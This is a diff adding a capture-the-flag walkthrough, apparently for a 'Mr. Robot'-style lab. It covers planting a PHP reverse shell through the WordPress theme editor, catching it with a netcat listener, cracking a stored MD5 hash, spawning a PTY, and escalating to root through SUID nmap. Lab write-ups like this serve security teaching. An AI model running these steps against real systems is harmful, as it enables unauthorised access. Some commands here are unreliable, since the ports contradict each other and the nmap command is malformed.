@@ -80,3 +80,80 @@ When we login we will be greeted by this wordpress portal
 ## deploying a backdoor on the site
 
 we will be using a **reverse shell** on the site to get access to the ssh server attached to the host machine 
+first we will need to find a page that we will use to initialise our reverse shell to do this we navigate to the appearance tab and select editor 
+![wp themes](https://femboy.beauty/PpXgm.png)
+next we will need a reverse shell script I will be using [this one](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) 
+now we just enter the script into the editor in the wordpress admin portal like so
+![enter image description here](https://femboy.beauty/cVnay.png)
+**MAKE SURE YOU ENTER THE SCRIPT INTO ARCHIVES.PHP**
+in the script there are these 2 lines near the top:
+
+    $ip = '127.0.0.1';  // CHANGE THIS
+    $port = 1234;       // CHANGE THIS
+I will be changeing the port to 8080 and we will need to change the IP above to the IP of **your attack box** 
+   now that we have done that we click update file
+   on the attackbox open a new terminal and run the command below:
+   
+
+    nc -lnvp 8080
+    
+   this will listen on port 1234 for any incoming connections, to invoke a connection all we do is navigate to **http://[TARGET IP]/wp-content/themes/twentyfifteen/archive.php** 
+[Video of Reverse Shell working](https://femboy.beauty/Ooypc.mp4)
+
+now that we are in we can do some searching on the host server for goodies :3
+to start with I checked what was in the directory I booted into using the command **ls** next I checked what was in the home directory and found there was a folder called **robot**
+![enter image description here](https://femboy.beauty/_zmhx.png)
+
+next when i was in home/robot we find a few files of interest
+
+![enter image description here](https://femboy.beauty/jGFWO.png)
+
+and boom we have found key 2 of 3 to view its contents we would use cat how ever we lack permissions to open the file
+![enter image description here](https://femboy.beauty/xXBP4.png) 
+
+next lets try to read the contents of the password.raw-md5 file
+![enter image description here](https://femboy.beauty/Emcef.png)
+
+Perfect now we have a hashed password for the robot user
+to decrypt this hash I used [hashes.com](https://hashes.com/en/decrypt/hash)
+
+![enter image description here](https://femboy.beauty/dje3f.png)
+
+this gives us the password of **abcdefghijklmnopqrstuvwxyz**
+
+next we try to run su robot to try and login to the robot user how ever we can only run su in a terminal
+
+![enter image description here](https://femboy.beauty/Fyo50.png)
+
+to fix this all we need to do is run the python command below to force us into a terminal on the host 
+
+    python -c 'import pty;pty.spawn("/bin/bash")'
+now we have a full terminal on the host machine now to login to robot
+and view the content of the second key 
+
+![enter image description here](https://femboy.beauty/fM6dk.png)
+
+Next we will need to escalate our privileges to root 
+next we will check for  **SUID files** using the command below:
+
+    find / -perm -u=s -type f 2>/dev/null
+  
+  ![enter image description here](https://femboy.beauty/bI6gW.png)
+  
+as we can see here is all the file paths that have special permissions odly enough Nmap is listed above 
+as weird is it sounds we will use Nmap to escalate our privileges to root 
+all we need to do is open the nmap directory and boot nmap (yes it is that simple lol)
+to get root i ran the commands below:
+
+    cd /usr/local/bin/nmap --interactive 
+    !sh
+    whoami
+    
+
+![enter image description here](https://femboy.beauty/jMi9I.png)
+
+Now that we are root we can CD into the root directory and find our 3rd and final key :D
+
+![enter image description here](https://femboy.beauty/97ad2.png)
+
+and just like that we have our last key x3
